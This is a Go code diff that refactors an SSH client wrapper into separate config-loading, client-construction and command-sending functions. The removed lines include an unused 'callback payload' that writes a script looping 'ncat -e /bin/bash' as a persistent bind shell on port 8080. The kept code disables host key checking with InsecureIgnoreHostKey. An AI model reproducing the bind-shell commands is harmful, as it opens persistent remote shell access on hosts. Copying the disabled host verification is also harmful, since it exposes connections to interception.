@@ -13,28 +13,32 @@ import (
 )
 
 type SshClient struct {
-    Config *ssh_config.Config
+    Host string
+    ConfigFile *ssh_config.Config
+    ClientConfig *ssh.ClientConfig
 }
 
-func  NewSshClient(filePath string) *SshClient {
+func  NewSshConfigFile(filePath string) *ssh_config.Config {
     if filePath == "" {
         filePath = filepath.Join(os.Getenv("HOME"), ".ssh", "config")
     }
     file, _ := os.Open(filePath) 
-    config, _ := ssh_config.Decode(file)
+    configFile, _ := ssh_config.Decode(file)
 
-    return &SshClient {
-        Config: config,
-    }
+    return configFile
 }
 
-func (sc *SshClient) SshConn(host string) {
-    if _, err := (sc.Config.Get(host, "HostName")); err != nil {
+func NewSshClient(host string, configFile *ssh_config.Config) *SshClient {
+    sc := SshClient{
+        Host: host,
+        ConfigFile: configFile,
+    }
+    if _, err := (sc.ConfigFile.Get(host, "HostName")); err != nil {
         log.Error("Host not found in ssh-config: " + host)
     }
 
-    identitaFile, _ := sc.Config.Get(host, "IdentityFile")
-    key, err := ioutil.ReadFile(identitaFile)
+    identityFile, _ := sc.ConfigFile.Get(host, "IdentityFile")
+    key, err := ioutil.ReadFile(identityFile)
     if err != nil {
         log.Fatal(err)
     }
@@ -44,55 +48,37 @@ func (sc *SshClient) SshConn(host string) {
         log.Fatal(err)
     }
 
-    user, _ := sc.Config.Get(host, "User")
-    config := &ssh.ClientConfig{
+    user, _ := sc.ConfigFile.Get(host, "User")
+    clientConfig := &ssh.ClientConfig{
     	User:            user,
     	Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
         HostKeyCallback: ssh.InsecureIgnoreHostKey(),
     }
+    sc.ClientConfig = clientConfig
+    return &sc
+}
 
-    hostName, _ := sc.Config.Get(host, "HostName")
-    port, _ := sc.Config.Get(host, "Port")
+func (sc* SshClient) SendCmd(cmd string) ([]byte, error) {
+    hostName, _ := sc.ConfigFile.Get(sc.Host, "HostName")
+    port, _ := sc.ConfigFile.Get(sc.Host, "Port")
     network := fmt.Sprintf("%s:%s", hostName, port)
     conn, err := ssh.Dial(
         "tcp",
         network,
-        config,
+        sc.ClientConfig,
     )
     if err != nil {
-        log.Fatal(err)
+        return nil, err
     }
     defer conn.Close()
 
-    // Callback payload
-    // Persists even when we kill the session
-    _ = []string{
-        "touch /tmp/hack.sh",
-        "chmod +x /tmp/hack.sh",
-        "echo '#!/bin/bash' > /tmp/hack.sh",
-        "echo 'while true; do ncat -e /bin/bash -lp 8080; done &' >> /tmp/hack.sh",
-        "/tmp/hack.sh",
+    session, err := conn.NewSession()
+    if err != nil {
+        return nil, err
     }
+    defer session.Close()
 
-    cmds := []string{
-        psCmd,
-    }
-    for _, cmd := range(cmds) {
-        log.Infof(">> %s", cmd)
-        session, err := conn.NewSession()
-        if err != nil {
-            log.Fatal(err)
-        }
-        defer session.Close()
-
-        output, err := session.CombinedOutput(cmd)
-        if err != nil {
-            log.Fatal(err)
-        }
-        pm := NewProcMap(string(output))
-        for hash := range(pm) {
-            log.Infof("%+v\n", pm[hash]) 
-        }
-    }
+    output, err := session.CombinedOutput(cmd)
+    return output, err
 }
 
